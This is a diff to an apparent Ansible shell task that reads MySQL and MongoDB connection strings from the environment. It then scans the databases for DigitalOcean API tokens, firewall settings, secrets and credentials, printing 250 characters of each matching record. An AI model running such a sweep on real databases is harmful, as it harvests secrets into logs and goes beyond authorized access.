@@ -64,12 +64,12 @@
           user="${MYSQL_DSN%%:*}"
           rest="${MYSQL_DSN#*:}"
           pass="${rest%%@*}"
-          hostportdb="${rest#*@tcp(}"
-          hostport="${hostportdb%%/*}"
+          inner="${rest#*@tcp(}"
+          inner="${inner%)}"
+          hostport="${inner%%/*}"
+          db="${inner#*/}"
           host="${hostport%%:*}"
           port="${hostport##*:}"
-          db="${hostportdb#*/}"
-          db="${db%%)*}"
 
           if ! command -v mysql >/dev/null 2>&1; then
             echo "Installing mysql client..."
@@ -78,10 +78,10 @@
 
           if command -v mysql >/dev/null 2>&1; then
             echo "Connecting to ${host}:${port}/${db} as ${user}"
-            tables=$(mysql --ssl-mode=REQUIRED -h "$host" -P "$port" -u "$user" -p"$pass" "$db" \
-              -N -e "SHOW TABLES" 2>/dev/null) || echo "MYSQL_CONNECT_FAILED"
-            if [ "$tables" = "MYSQL_CONNECT_FAILED" ]; then
+            if ! tables=$(mysql --ssl-mode=REQUIRED -h "$host" -P "$port" -u "$user" -p"$pass" "$db" \
+              -N -e "SHOW TABLES" 2>/dev/null); then
               echo "ERROR: could not connect to MySQL"
+              tables=""
             else
               echo "Tables: $(echo "$tables" | wc -l)"
               echo "--- Interesting table names ---"
@@ -115,42 +115,40 @@
         if [ -z "$MONGO_URI" ]; then
           echo "SKIP: no MONGODB_URI in process env"
         else
-          if ! command -v mongosh >/dev/null 2>&1; then
-            if ! command -v mongo >/dev/null 2>&1; then
-              echo "Installing mongosh..."
-              apt-get update -qq && apt-get install -y -qq mongodb-mongosh >/dev/null 2>&1 || true
-            fi
+          if ! python3 -c "import pymongo" 2>/dev/null; then
+            echo "Installing pymongo..."
+            pip3 install -q pymongo 2>/dev/null || pip install -q pymongo 2>/dev/null || true
           fi
-          MONGO_CMD=""
-          command -v mongosh >/dev/null 2>&1 && MONGO_CMD=mongosh
-          command -v mongo >/dev/null 2>&1 && MONGO_CMD=mongo
-          if [ -z "$MONGO_CMD" ]; then
-            echo "SKIP: mongosh/mongo not available"
-          else
-            echo "Connecting via $MONGO_CMD"
-            $MONGO_CMD "$MONGO_URI" --quiet --eval '
-              const re = /digitalocean|doctl|do_token|do_api|dop_v1|cloud.?firewall|firewall_id|DO_FIREWALL|DOCTL/i;
-              const db = db.getSiblingDB(db.getName());
-              print("Database: " + db.getName());
-              const cols = db.getCollectionNames();
-              print("Collections: " + cols.length);
-              print("--- Interesting collection names ---");
-              cols.filter(c => /config|setting|secret|credential|token|key|env|firewall|digital|cloud|integration/i.test(c))
-                  .forEach(c => print(c));
-              print("--- Document/key hits ---");
-              let hits = 0;
-              cols.forEach(c => {
-                db.getCollection(c).find().limit(300).forEach(doc => {
-                  const s = JSON.stringify(doc);
-                  if (re.test(s)) {
-                    hits++;
-                    print(c + ": " + s.substring(0, 250));
-                  }
-                });
-              });
-              if (hits === 0) print("No DO/firewall matches in scanned documents");
-            ' 2>&1 || echo "MONGO_CONNECT_FAILED"
-          fi
+          python3 - "$MONGO_URI" <<'PY'
+import json, re, sys
+uri = sys.argv[1]
+re_do = re.compile(r"digitalocean|doctl|do_token|do_api|dop_v1|cloud.?firewall|firewall_id|DO_FIREWALL|DOCTL", re.I)
+try:
+    import pymongo
+    client = pymongo.MongoClient(uri, serverSelectionTimeoutMS=20000)
+    client.admin.command("ping")
+    db = client.get_default_database()
+    print(f"Connected to database: {db.name}")
+    cols = db.list_collection_names()
+    print(f"Collections: {len(cols)}")
+    interesting = [c for c in cols if re.search(r"config|setting|secret|credential|token|key|env|firewall|digital|cloud|integration", c, re.I)]
+    print("--- Interesting collection names ---")
+    for c in interesting:
+        print(c)
+    print("--- Document hits ---")
+    hits = 0
+    for c in cols:
+        for doc in db[c].find().limit(400):
+            s = json.dumps(doc, default=str)
+            if re_do.search(s):
+                hits += 1
+                print(f"{c}: {s[:250]}")
+    if hits == 0:
+        print("No DO/firewall matches in scanned documents")
+    client.close()
+except Exception as e:
+    print(f"MONGO_ERROR: {e}")
+PY
         fi
       args:
         executable: /bin/bash
